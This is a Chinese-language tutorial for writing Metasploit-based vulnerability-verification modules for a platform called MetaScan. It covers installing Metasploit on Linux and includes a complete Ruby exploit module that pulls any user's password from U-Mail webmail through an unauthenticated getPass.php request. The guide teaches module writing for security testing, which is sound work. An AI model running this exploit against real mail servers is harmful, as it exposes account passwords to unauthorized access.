快速入门
========

简介
^^^^

　　MetaScan漏洞验证平台基于metasploit-framework框架而推，基于这个框架，你可以编写出属于你自己的漏洞验证模块，编写模块的相关说明，此文档将做详细的描述，同时我们也会奉上例子供您参考。期待您的加入，让我们一同成为安全牛。

环境配置
^^^^^^^^

1.下载程序

　　磨刀不误砍柴工，在写模块之前需要搭建好相关环境。如果你是个勤劳的白帽子，我们建议您在*nix系统中完整的安装一次Metasploit，有助于对该框架的多一些了解，不过，熟悉kali的人大都知道系统自身带有现成的环境。Metasploit和Kali Linux的相关下载地址参考如下::

　　Metasploit境内官方下载地址：http://www.metasploit.cn/thread-3-1-1.html
　　Metaspoit境外官方下载地址：
　　--Metasploit for Linux 64-bit:
　　Kali Linux境内官方下载地址：
　　Kali Linux境外官方下载地址：https://www.kali.org/downloads/

2.安装程序

　　Metasploit因存在windows和linux两个版本，windows下的安装方式较为常规，此处只介绍在linux系统下的安装方法。

a、添加执行权限：：
　　64位：chmod +x /path/to/metasploit-latest-linux-x64-installer.run
　　32位：chmod +x /path/to/metasploit-latest-linux-installer.run

b、以root权限运行安装程序
　　64位：sudo /path/to/metasploit-latest-linux-x64-installer.run
　　32位：sudo /path/to/metasploit-latest-linux-installer.run

c、在出现Metasploit的安装窗口之后，均按默认选项执行并单击‘Forward’即可完成安装。
 
注：编写Metaplosit模块所使用的语言是ruby， Metasploit和Kali Linux在安装完成后均包含了需要的ruby环境，用户可以直接进行相关操作，至于IDE以及Metasploit的两个不同平台的版本选择，此处不做推荐，可以根据自身熟悉情况而定。

3.相关目录

进入Metasploit的目录::

　　cd /opt/metasploit/apps/pro/msf3/modules/exploits

注：该目录存放的主要是漏洞验证相关的模块，用户所写的相关漏洞验证模块均存放在此目录下，感兴趣的白帽子也可以写一些工具性的模块，工具性的模块主要存放在/opt/metasploit/apps/pro/msf3/modules/auxiliary目录中，但类似这些模块均不在此文档中做说明，用户可自行研究。

编写模块
^^^^^^^^

1.编写规范

参考如下::
　　https://ruby-china.org/wiki/coding-style

2.示例参考

　　以乌云上的漏洞来源为例子：http://www.wooyun.org/bugs/wooyun-2010-061894（用户在写模块时，可自行从网上搜索漏洞）

　　U-Mail邮件系统权限设置问题导致任意用户密码可越权查看，指定为一个已存在的邮箱账号即可查看任意账户密码。

　　新建一个新的利用模块umail_pass.rb：：
　　cd /opt/metasploit/apps/pro/msf3/modules/exploits
　　vi umail_pass.rb

　　示例代码如下::

　　#encoding:utf-8
　　require 'msf/core'
　　class Metasploit3 < Msf::Exploit::Remote
　　  Rank = ExcellentRanking
　　  include Msf::Exploit::Remote::HttpClient
　　
　　  def initialize(info={})
　　    super(update_info(info,
　　        'Name'           => "U-Mail System Unauthorized Access Vulnerability",
　　        'Description'    => %q{
　　          　　U-Mail邮件系统权限设置问题导致任意用户密码可越权查看，当updata参数的值为s，只需将email参数的值指定为一个已存在的邮箱账号即可查看任意账户密码。
　　        },
　　        'License'        => MSF_LICENSE,
　　        'Author'         =>
　　          [
　　          'Rain'    #Metasploit-CNNS
　　        ],
　　        'Platform'        => [ 'php' ],
　　        'Arch'           => ARCH_PHP,
　　        'Targets'        =>[[ 'U-Mail', { }]],
　　        'Privileged'     => false,
　　        'DisclosureDate' => "Apr 11 2011",
　　        'DefaultTarget'  => 0))
　　    register_options(
　　      [
　　        OptString.new('RHOST', [true, 'The DOMAIN', '']), 
　　        OptString.new('RPORT', [true, 'The port', '80']),
　　        OptString.new('TARGETURI', [true, 'The base path to U-Mail', '/webmail/']),
　　        OptString.new('EMAIL', [true, 'The email to U-Mail', '']),
　　      ], self.class)
　　  end
　　
　　  def exploit
　　    begin
　　	    res = send_request_cgi( {
　　	        'method' => "GET",
　　	        'uri'    => normalize_uri(datastore['TARGETURI']) + "/getPass.php?update=s&email=#{datastore['EMAIL']}"
　　	      }, 20)
　　    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
　　    rescue ::Timeout::Error, ::Errno::EPIPE
　　    end
　　      body_data = res.body.force_encoding('UTF-8')
　　      if body_data =~ /你的密码是/
　　        data = body_data.scan(/你的密码是\<\/p\>\<p\>\<center\>\<font color=red\>(.*?)\<\/font\>/)
　　        if data and data.first and data.first.first
　　          print_good("---------账号--------\n邮箱 = #{datastore['EMAIL']}, 密码 = #{data.first.first}", "good")
　　        else 
　　          print_error("漏洞利用失败！")
　　        end
　　      else
　　        print_error("漏洞利用失败！")
　　      end
　　  end
　　end


常见问题
^^^^^^^^